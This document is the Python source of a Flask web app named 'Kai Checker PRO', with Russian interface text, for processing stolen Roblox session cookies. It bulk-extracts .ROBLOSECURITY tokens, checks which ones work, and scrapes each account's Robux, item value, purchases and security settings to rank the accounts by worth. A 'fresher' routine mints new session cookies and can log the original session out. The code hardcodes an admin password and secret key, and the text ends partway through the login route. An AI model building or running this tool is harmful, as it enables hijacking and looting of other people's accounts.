import os
import time
import logging
import re
import urllib3
import json
import io
import zipfile
import uuid
import sqlite3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from functools import wraps
from werkzeug.security import generate_password_hash, check_password_hash
from flask import Flask, render_template_string, request, jsonify, send_from_directory, send_file, session, redirect, url_for

# ==========================================
# ИНИЦИАЛИЗАЦИЯ И БАЗА ДАННЫХ (SQLite)
# ==========================================
os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
DB_PATH = "data.db"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Таблица пользователей
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE,
                    password TEXT
                )''')
                
    # Таблица истории чекера
    c.execute('''CREATE TABLE IF NOT EXISTS checker_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id TEXT,
                    timestamp TEXT,
                    type TEXT,
                    total INTEGER,
                    valid INTEGER,
                    usernames TEXT,
                    results TEXT,
                    full_reports TEXT
                )''')
                
    # Таблица истории фрешера
    c.execute('''CREATE TABLE IF NOT EXISTS fresher_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id TEXT,
                    timestamp TEXT,
                    mode TEXT,
                    refreshed_count INTEGER,
                    usernames TEXT,
                    cookies TEXT
                )''')
    
    # Создание аккаунта по умолчанию (CowBoy)
    admin_user = "CowBoy"
    admin_pass = "Qk5-sva-8uG"
    c.execute("SELECT id FROM users WHERE username=?", (admin_user,))
    if not c.fetchone():
        hashed_pass = generate_password_hash(admin_pass)
        c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (admin_user, hashed_pass))
        logger.info(f"Аккаунт {admin_user} успешно создан!")

    conn.commit()
    conn.close()

init_db()

# ==========================================
# ДЕКОРАТОР АВТОРИЗАЦИИ
# ==========================================
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session or not session['logged_in']:
            if request.is_json or request.path.startswith('/api/'):
                return jsonify({'success': False, 'message': 'Unauthorized'}), 401
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def get_user_download_dir():
    sid = session.get('user_id', 'default_user')
    user_dir = os.path.join("downloads", str(sid))
    os.makedirs(user_dir, exist_ok=True)
    return user_dir, sid

# ==========================================
# БЛОК: РАБОТА С БД (ИСТОРИЯ)
# ==========================================
def add_checker_history(entry):
    sid = str(session.get('user_id', 'default_user'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO checker_history (user_id, timestamp, type, total, valid, usernames, results, full_reports)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', (
        sid,
        datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        entry.get('type', 'single'),
        entry.get('total', 1),
        entry.get('valid', 0),
        json.dumps(entry.get('usernames', []), ensure_ascii=False),
        json.dumps(entry.get('results', []), ensure_ascii=False),
        json.dumps(entry.get('full_reports', []), ensure_ascii=False)
    ))
    conn.commit()
    conn.close()

def get_checker_history():
    sid = str(session.get('user_id', 'default_user'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT timestamp, type, total, valid, usernames, results, full_reports 
                 FROM checker_history WHERE user_id=? ORDER BY id DESC LIMIT 50''', (sid,))
    rows = c.fetchall()
    conn.close()
    
    history = []
    for r in rows:
        history.append({
            'timestamp': r[0], 'type': r[1], 'total': r[2], 'valid': r[3],
            'usernames': json.loads(r[4]), 'results': json.loads(r[5]), 'full_reports': json.loads(r[6])
        })
    return history

def clear_checker_history():
    sid = str(session.get('user_id', 'default_user'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM checker_history WHERE user_id=?", (sid,))
    conn.commit()
    conn.close()

def add_fresher_history(entry):
    sid = str(session.get('user_id', 'default_user'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO fresher_history (user_id, timestamp, mode, refreshed_count, usernames, cookies)
                 VALUES (?, ?, ?, ?, ?, ?)''', (
        sid,
        datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        entry.get('mode', 'duplicate'),
        entry.get('refreshed_count', 0),
        json.dumps(entry.get('usernames', []), ensure_ascii=False),
        json.dumps(entry.get('cookies', []), ensure_ascii=False)
    ))
    conn.commit()
    conn.close()

def get_fresher_history():
    sid = str(session.get('user_id', 'default_user'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT timestamp, mode, refreshed_count, usernames, cookies 
                 FROM fresher_history WHERE user_id=? ORDER BY id DESC LIMIT 50''', (sid,))
    rows = c.fetchall()
    conn.close()
    
    history = []
    for r in rows:
        history.append({
            'timestamp': r[0], 'mode': r[1], 'refreshed_count': r[2],
            'usernames': json.loads(r[3]), 'cookies': json.loads(r[4])
        })
    return history

def clear_fresher_history():
    sid = str(session.get('user_id', 'default_user'))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM fresher_history WHERE user_id=?", (sid,))
    conn.commit()
    conn.close()

# ==========================================
# БЛОК: ЧЕКЕР И АНАЛИТИКА
# ==========================================
def extract_cookies_from_text(text):
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    for match in re.findall(pattern, text):
        cookie = match.strip('",;\'\\')
        if cookie.startswith('.ROBLOSECURITY='): cookie = cookie[15:]
        if len(cookie) > 50: cookies.append(cookie)
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    for match in re.findall(pattern2, text):
        cookie = match.strip('",;\'\\')
        if len(cookie) > 50 and cookie not in cookies: cookies.append(cookie)
    seen = set()
    unique = []
    for c in cookies:
        if c not in seen: seen.add(c); unique.append(c)
    return unique

def get_user_rap(session, user_id):
    try:
        url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?assetType=All&limit=100"
        r = session.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json().get('data', [])
            val = sum(item.get('recentAveragePrice', 0) for item in data)
            return val if val > 0 else None
    except: pass
    return None

def get_user_playtime(session, user_id):
    try:
        url = f"https://screenshots.roblox.com/v1/users/{user_id}/play-time"
        r = session.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            data = r.json()
            seconds = data.get('totalPlayTimeSeconds', 0)
            if seconds > 0:
                return round(seconds / 3600, 1)
    except: pass
    return None

def get_full_info(cookie):
    info = {
        'status':'❌', 'Username':'?', 'UserID':'?', 'Robux':0, 'RAP': None, 'PlaytimeHours': None,
        'Created':'?', 'Country':'?', 'EmailSet':False, 'TwoFactorEnabled':False,
        'AccountPinEnabled':False, 'PhoneSet':False, 'SecurityStatus':'⚠️ НИЗКИЙ',
        'Cookie':cookie, 'PurchasedGamepasses':{}, 'CreditCardsCount':0,
        'IsPremium':False, 'DonationTotal':0
    }
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'Cookie': f'.ROBLOSECURITY={c}', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': 'application/json'})

        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=12, verify=False)
        if r.status_code != 200: return info
        d = r.json()
        if 'id' not in d: return info
        info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=8)
                return r.json() if r.status_code == 200 else {}
            except: return {}

        sd = g('https://www.roblox.com/my/settings/json')
        if sd:
            sec = sd.get('MyAccountSecurityModel',{})
            info['EmailSet'] = sec.get('IsEmailSet',False); info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False); info['PhoneSet'] = sec.get('IsPhoneSet',False)
        
        pm = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if pm and pm.get('isSubscribed'): info['IsPremium'] = True

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except: pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb: info['Robux'] = rb.get('robux',0)
        
        info['RAP'] = get_user_rap(s, uid)
        info['PlaytimeHours'] = get_user_playtime(s, uid)

        ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if ct: info['Country'] = ct.get('countryCode','?')

        try:
            total = 0; gp_dict = {}; cursor = ""; page = 0
            while page < 3:
                url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
                if cursor: url += f"&cursor={cursor}"
                r = s.get(url, verify=False, timeout=8)
                if r.status_code != 200: break
                data = r.json()
                for item in data.get('data',[]):
                    price = abs(item.get('currency',{}).get('amount',0)); total += price
                    if price >= 50:
                        nm = item.get('details',{}).get('name','Товар')
                        pn = item.get('details',{}).get('place',{}).get('name','Другие игры')
                        if pn not in gp_dict: gp_dict[pn] = []
                        gp_dict[pn].append({'name':nm,'price':price})
                cursor = data.get('nextPageCursor')
                if not cursor: break
                page += 1; time.sleep(0.05)
            info['PurchasedGamepasses'] = gp_dict; info['DonationTotal'] = total
        except: pass

        sc = 0
        if info['EmailSet']: sc += 1
        if info['TwoFactorEnabled']: sc += 2
        if info['AccountPinEnabled']: sc += 1
        if info['PhoneSet']: sc += 1
        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if sc >= 4 else ('🔐 СРЕДНИЙ' if sc >= 2 else '⚠️ НИЗКИЙ')
    except: pass
    return info

def quick_validate(cookie):
    result = {
        'status':'❌', 'username':'?', 'user_id':'?', 'robux':0, 'rap': None, 'playtime': None,
        'created':'?', 'is_premium':False, 'has_email':False, 'has_2fa':False,
        'cookie':cookie, 'score':0, 'full_info': None
    }
    info = get_full_info(cookie)
    if info['status'] == '✅':
        result['status'] = '✅'
        result['username'] = info['Username']
        result['user_id'] = info['UserID']
        result['robux'] = info['Robux']
        result['rap'] = info['RAP']
        result['playtime'] = info['PlaytimeHours']
        result['created'] = info['Created']
        result['is_premium'] = info['IsPremium']
        result['has_email'] = info['EmailSet']
        result['has_2fa'] = info['TwoFactorEnabled']
        result['full_info'] = info
        
        score = 0
        if info['Robux'] >= 10000: score += 100
        elif info['Robux'] >= 1000: score += 50
        elif info['Robux'] > 0: score += 10
        if info['RAP'] and info['RAP'] > 5000: score += 50
        if info['IsPremium']: score += 50
        if info['EmailSet']: score += 15
        if info['TwoFactorEnabled']: score += 10
        result['score'] = score
    return result

def mass_check(cookies_list):
    results = []
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
        for f in as_completed(futures):
            try: results.append(f.result())
            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'rap':None,'playtime':None,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
    valid = [r for r in results if r['status']=='✅']; invalid = [r for r in results if r['status']=='❌']
    valid.sort(key=lambda x: x['score'], reverse=True)
    return valid + invalid

# ==========================================
# ФОРМАТТЕРЫ
# ==========================================
def format_full_report(info):
    if info['status'] != '✅': return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
    gp = info.get('PurchasedGamepasses',{})
    rap_str = f"⏣ {info['RAP']:,}" if info['RAP'] is not None else "❌"
    play_str = f"{info['PlaytimeHours']} ч." if info['PlaytimeHours'] is not None else "❌"
    
    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💎 RAP: {rap_str} | ⏱️ Плейтайм: {play_str}\n"
    r += f"💸 Донат: ⏣ {info['DonationTotal']:,} | ⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
    r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
    if gp:
        r += "📦 ГЕЙМПАССЫ:\n"
        for game, passes in list(gp.items())[:3]:
            for p in passes[:5]: r += f"  {game} - {p['name']} ({p['price']} R$)\n"
    r += f"\n🍪 {info['Cookie']}"
    return r

def format_quick_report(result):
    if result['status'] == '✅':
        score = result.get('score',0)
        rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else "🟢"))
        badges = []
        if result.get('is_premium'): badges.append("💠")
        if result.get('has_2fa'): badges.append("🔐")
        rap_str = f"RAP: {result['rap']:,}" if result['rap'] is not None else "RAP: ❌"
        play_str = f"{result['playtime']}h" if result['playtime'] is not None else "⏱️ ❌"
        return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} ({rap_str}) | {play_str} | S:{score} {' '.join(badges)}"
    return f"❌ НЕВАЛИД"

# ==========================================
# БЛОК: ФРЕШЕР
# ==========================================
def refresh_roblox_cookie(cookie, kill_old=False):
    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        cookies_dict = {'.ROBLOSECURITY': c}
        check_s = requests.Session()
        check_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        check_r = check_s.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, timeout=10, verify=False)
        if check_r.status_code != 200:
            result['error'] = "Кука невалидна"; return result
        user_data = check_r.json()
        result['username'] = user_data.get('name', '?'); result['user_id'] = user_data.get('id', '?')
        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, verify=False, timeout=10)
        csrf_token = csrf_r.headers.get('x-csrf-token')
        if not csrf_token:
            result['error'] = "CSRF token not found"; return result
        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'referer': 'https://www.roblox.com/hewhewhew', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, verify=False, timeout=15)
        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
        if not auth_ticket:
            result['error'] = "Auth ticket not found"; return result
        redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, verify=False, timeout=15)
        new_cookie_value = None
        set_cookie = redeem_r.headers.get('Set-Cookie', '')
        if '.ROBLOSECURITY=' in set_cookie:
            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
            if match: new_cookie_value = match.group(1)
        if not new_cookie_value:
            for co in redeem_r.cookies:
                if co.name == '.ROBLOSECURITY' and co.value: new_cookie_value = co.value; break
        if not new_cookie_value:
            result['error'] = "New cookie not found"; return result
        if kill_old:
            try:
                break_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
                requests.post('https://auth.roblox.com/v2/logout', headers=break_headers, cookies=cookies_dict, verify=False, timeout=10)
            except: pass
        test_s = requests.Session()
        test_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie_value}, verify=False, timeout=10)
        if test_r.status_code == 200 and 'id' in test_r.json():
            result['new_cookie'] = new_cookie_value; result['success'] = True
        else:
            result['error'] = "New cookie validation failed"
    except Exception as e:
        result['error'] = str(e)
    return result

def remove_duplicates(content):
    cookies = extract_cookies_from_text(content)
    return '\n'.join(cookies)

# ==========================================
# FLASK APP & СТИЛИ
# ==========================================
app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "kai_checker_cowboy_key_2026")

LOGIN_HTML = r"""<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Вход | Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
        body { background: #07030d; color: #f3e8ff; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .login-card { background: rgba(23, 10, 38, 0.75); border: 1px solid rgba(168, 85, 247, 0.3); padding: 36px; border-radius: 24px; width: 100%; max-width: 400px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); backdrop-filter: blur(20px); }
        h1 { font-size: 24px; font-weight: 800; text-align: center; margin-bottom: 24px; background: linear-gradient(135deg, #f472b6, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .form-group { margin-bottom: 16px; }
        label { display: block; font-size: 12px; font-weight: 700; color: #a78bfa; margin-bottom: 6px; }
        input { width: 100%; padding: 12px 16px; background: rgba(12, 5, 20, 0.75); border: 1px solid rgba(168, 85, 247, 0.3); border-radius: 12px; color: #fff; font-size: 14px; outline: none; }
        input:focus { border-color: #d946ef; }
        button { width: 100%; padding: 12px; background: linear-gradient(135deg, #7e22ce, #a855f7); border: none; border-radius: 12px; color: #fff; font-weight: 700; cursor: pointer; margin-top: 12px; }
        button:hover { opacity: 0.9; }
        .error { color: #fca5a5; font-size: 12px; text-align: center; margin-top: 12px; font-weight: 600; }
    </style>
</head>
<body>
    <div class="login-card">
        <h1>Kai Checker PRO</h1>
        <form method="POST">
            <div class="form-group">
                <label>Имя пользователя</label>
                <input type="text" name="username" required>
            </div>
            <div class="form-group">
                <label>Пароль</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Войти</button>
            {% if error %}
            <div class="error">{{ error }}</div>
            {% endif %}
        </form>
    </div>
</body>
</html>"""

INDEX_HTML = r"""<!DOCTYPE html>
<html lang="ru" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Rubik+Puddles&family=Paytone+One&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #07030d;
            --bg-card: rgba(23, 10, 38, 0.55);
            --border-card: rgba(168, 85, 247, 0.25);
            --border-hover: rgba(217, 70, 239, 0.6);
            --input-bg: rgba(12, 5, 20, 0.75);
            --text-main: #f3e8ff;
            --text-muted: #a78bfa;
            --accent-purple: #9333ea;
            --accent-pink: #c026d3;
            --accent-glow: rgba(168, 85, 247, 0.2);
            --gradient-primary: linear-gradient(135deg, #a855f7 0%, #d946ef 50%, #6366f1 100%);
            --gradient-btn: linear-gradient(135deg, #7e22ce 0%, #a855f7 100%);
            --gradient-btn-hover: linear-gradient(135deg, #9333ea 0%, #c026d3 100%);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            min-height: 100vh;
            background: var(--bg);
            color: var(--text-main);
            position: relative;
            overflow-x: hidden;
            padding: 24px 16px;
        }

        .wrapper {
            max-width: 1350px; margin: 0 auto; position: relative; z-index: 1;
            background: var(--bg-card); border: 1px solid var(--border-card);
            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
            border-radius: 28px; padding: 32px; box-shadow: 0 20px 60px rgba(0,0,0,0.6);
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding-bottom: 24px; border-bottom: 1px solid var(--border-card);
            margin-bottom: 28px; flex-wrap: wrap; gap: 16px;
        }
        .logo-wrap { display: flex; align-items: center; gap: 14px; }

        .logo-text {
            font-family: 'Paytone One', 'Rubik Puddles', cursive, sans-serif;
            font-size: 38px; font-weight: 900; letter-spacing: 1px;
            background: linear-gradient(135deg, #f472b6 0%, #d946ef 40%, #a855f7 100%);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            text-shadow: 0 0 15px rgba(217, 70, 239, 0.3); display: inline-block;
        }

        .user-info { display: flex; align-items: center; gap: 12px; }
        .user-name { font-weight: 700; color: var(--accent-pink); font-size: 14px; }

        .tabs {
            display: flex; gap: 12px; margin-bottom: 32px; background: var(--input-bg);
            padding: 8px; border-radius: 22px; border: 1px solid var(--border-card);
            width: fit-content; flex-wrap: wrap;
        }
        .tab {
            padding: 14px 32px; border-radius: 16px; color: var(--text-muted); cursor: pointer;
            font-size: 15px; font-weight: 700; transition: all 0.3s;
            border: 1px solid transparent; background: transparent;
        }
        .tab.active { background: var(--gradient-btn); color: #fff; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        .card {
            background: var(--bg-card); border: 1px solid var(--border-card);
            border-radius: 20px; padding: 24px; margin-bottom: 20px;
        }
        .card h2 { font-size: 16px; font-weight: 800; margin-bottom: 16px; color: var(--text-main); }

        .btn {
            padding: 12px 24px; border: none; border-radius: 14px;
            font-size: 13px; font-weight: 700; cursor: pointer; color: #fff;
            display: inline-flex; align-items: center; justify-content: center; gap: 8px; text-decoration: none;
        }
        .btn-primary { background: var(--gradient-btn); }
        .btn-secondary { background: var(--input-bg); border: 1px solid var(--border-card); color: var(--text-muted); }
        .btn-danger { background: rgba(239, 68, 68, 0.2); border: 1px solid rgba(239, 68, 68, 0.4); color: #fca5a5; }
        .btn-danger:hover { background: rgba(239, 68, 68, 0.4); }

        textarea, input {
            width: 100%; padding: 14px; background: var(--input-bg);
            border: 1px solid var(--border-card); border-radius: 14px; color: var(--text-main);
            font-family: monospace; font-size: 12px;
        }

        .upload-area {
            min-height: 110px; border: 2px dashed var(--border-card); border-radius: 16px;
            background: var(--input-bg); display: flex; flex-direction: column; align-items: center;
            justify-content: center; cursor: pointer; text-align: center; padding: 16px;
        }

        .result-box {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 14px; padding: 14px; max-height: 400px; overflow-y: auto;
            font-family: monospace; font-size: 12px; color: var(--text-main);
            white-space: pre-wrap; word-break: break-all; margin-top: 6px;
        }

        .checker-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media(max-width:900px){ .checker-grid { grid-template-columns: 1fr; } }

        .history-card {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 16px; padding: 16px; margin-bottom: 14px;
        }
        .history-header { display: flex; justify-content: space-between; align-items: center; font-size: 13px; font-weight: 700; color: var(--accent-pink); }
        .history-actions { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="logo-wrap">
            <div class="logo-text">KAI CHECKER</div>
        </div>
        <div class="user-info">
            <span class="user-name">👤 {{ username }}</span>
            <a href="/logout" class="btn btn-secondary" style="padding: 6px 12px; font-size:12px;">Выйти</a>
        </div>
    </div>

    <div class="tabs">
        <button class="tab active" data-tab="checker">🔍 Чекер</button>
        <button class="tab" data-tab="fresher">🔄 Фрешер</button>
        <button class="tab" data-tab="history">📋 История (БД)</button>
        <button class="tab" data-tab="tools">🧰 Инструменты</button>
    </div>

    <!-- ЧЕКЕР -->
    <div class="tab-content active" id="tab-checker">
        <div class="checker-grid">
            <div class="card">
                <h2>🔍 Одиночная проверка</h2>
                <textarea id="singleCookie" placeholder="Вставьте ОДИН .ROBLOSECURITY кук..." rows="5"></textarea>
                <button class="btn btn-primary" onclick="runSingleCheck()" style="margin-top:12px;width:100%;">Проверить кук</button>
                <div class="result-box" id="singleResult" style="display:none;margin-top:12px;"></div>
            </div>
            <div class="card">
                <h2>📦 Массовая проверка</h2>
                <div class="upload-area" onclick="document.getElementById('massFile').click()">
                    <p style="font-weight:700;">📁 Перетащите TXT файл с куками</p>
                </div>
                <input type="file" id="massFile" accept=".txt" style="display:none;">
                <button class="btn btn-primary" onclick="runMassCheck()" style="margin-top:12px;width:100%;">🚀 Запустить массовый чек</button>
                <div class="result-box" id="massResult" style="display:none;margin-top:12px;"></div>
            </div>
        </div>
    </div>

    <!-- ФРЕШЕР -->
    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Обновление сессий</h2>
            <textarea id="fresherCookies" placeholder="Вставьте куки списком..." rows="6"></textarea>
            <button class="btn btn-primary" onclick="runFresher()" style="margin-top:12px;">⚡ Обновить куки</button>
            <div class="result-box" id="fresherResult" style="display:none;margin-top:12px;"></div>
        </div>
    </div>

    <!-- ИСТОРИЯ -->
    <div class="tab-content" id="tab-history">
        <div class="card">
            <div class="history-actions">
                <h2>📋 История Чекера</h2>
                <button class="btn btn-danger" onclick="clearHistory('checker')">🗑️ Очистить историю чекера</button>
            </div>
            <div id="checkerHistoryList">Загрузка...</div>
        </div>
        <div class="card">
            <div class="history-actions">
                <h2>🔄 История Фрешера</h2>
                <button class="btn btn-danger" onclick="clearHistory('fresher')">🗑️ Очистить историю фрешера</button>
            </div>
            <div id="fresherHistoryList">Загрузка...</div>
        </div>
    </div>

    <!-- ИНСТРУМЕНТЫ -->
    <div class="tab-content" id="tab-tools">
        <div class="card">
            <h2>🧹 Очистка от дубликатов</h2>
            <textarea id="cleanInput" placeholder="Вставьте куки..." rows="5"></textarea>
            <button class="btn btn-primary" onclick="cleanCookies()" style="margin-top:12px;">Удалить дубликаты</button>
            <div class="result-box" id="cleanResult" style="display:none;margin-top:10px;"></div>
        </div>
    </div>
</div>

<script>
function activateTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    const targetBtn = document.querySelector(`.tab[data-tab="${tabName}"]`);
    const targetContent = document.getElementById('tab-' + tabName);
    if(targetBtn && targetContent) {
        targetBtn.classList.add('active'); targetContent.classList.add('active');
        if(tabName === 'history') { loadCheckerHistory(); loadFresherHistory(); }
    }
}
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() { activateTab(this.dataset.tab); });
});

async function runSingleCheck() {
    const cookie = document.getElementById('singleCookie').value.trim();
    if(!cookie) return alert('Вставьте кук!');
    document.getElementById('singleResult').style.display = 'block';
    document.getElementById('singleResult').textContent = '⏳ Проверка...';
    const res = await fetch('/api/single-check', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookie}) });
    const data = await res.json();
    document.getElementById('singleResult').textContent = data.report || 'Ошибка';
}

async function runMassCheck() {
    const file = document.getElementById('massFile').files[0];
    if(!file) return alert('Выберите файл!');
    const fd = new FormData(); fd.append('file', file);
    document.getElementById('massResult').style.display = 'block';
    document.getElementById('massResult').textContent = '⏳ Чек...';
    const res = await fetch('/api/mass-check', { method: 'POST', body: fd });
    const data = await res.json();
    if(data.success) {
        document.getElementById('massResult').textContent = data.results.join('\n\n');
    }
}

async function runFresher() {
    const cookies = document.getElementById('fresherCookies').value.trim();
    if(!cookies) return alert('Вставьте куки!');
    document.getElementById('fresherResult').style.display = 'block';
    document.getElementById('fresherResult').textContent = '⏳ Обновление...';
    const res = await fetch('/api/fresher', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookies, mode:'duplicate'}) });
    const data = await res.json();
    document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка';
}

async function loadCheckerHistory() {
    const res = await fetch('/api/history/checker');
    const data = await res.json();
    let html = '';
    data.history.forEach((i) => {
        html += `<div class="history-card"><div class="history-header"><span>🕒 ${i.timestamp} — Валид: ${i.valid} / ${i.total}</span></div><div class="result-box">${i.results ? i.results.join('\n\n') : ''}</div></div>`;
    });
    document.getElementById('checkerHistoryList').innerHTML = html || 'История пуста';
}

async function loadFresherHistory() {
    const res = await fetch('/api/history/fresher');
    const data = await res.json();
    let html = '';
    data.history.forEach((i) => {
        html += `<div class="history-card"><div class="history-header"><span>🕒 ${i.timestamp} — Обновлено: ${i.refreshed_count} шт.</span></div><div class="result-box">${i.cookies ? i.cookies.join('\n') : ''}</div></div>`;
    });
    document.getElementById('fresherHistoryList').innerHTML = html || 'История пуста';
}

async function clearHistory(type) {
    if(!confirm('Вы уверены, что хотите полностью очистить эту историю?')) return;
    const res = await fetch(`/api/history/clear/${type}`, { method: 'POST' });
    const data = await res.json();
    if(data.success) {
        if(type === 'checker') loadCheckerHistory();
        else loadFresherHistory();
    }
}

async function cleanCookies() {
    const content = document.getElementById('cleanInput').value;
    if(!content.trim()) return alert('Вставьте куки!');
    const res = await fetch('/api/clean-cookies', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content})});
    const data = await res.json();
    if(data.success) {
        document.getElementById('cleanResult').style.display = 'block';
        document.getElementById('cleanResult').innerHTML = `✅ Найдено уникальных: ${data.count} шт.`;
    }
}
</script>
</body>
</html>"""

# ==========================================
# МАРШРУТЫ АВТОРИЗАЦИИ И API
# ==========================================
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT id, password FROM users WHERE username=?", (username,))
        row = c.fetchone()
        conn.close()
        
        if row and check_password_hash(row[1], password):
            session['logged_in'] = True
            session['user_id'] = row[0]
            session['username'] = username
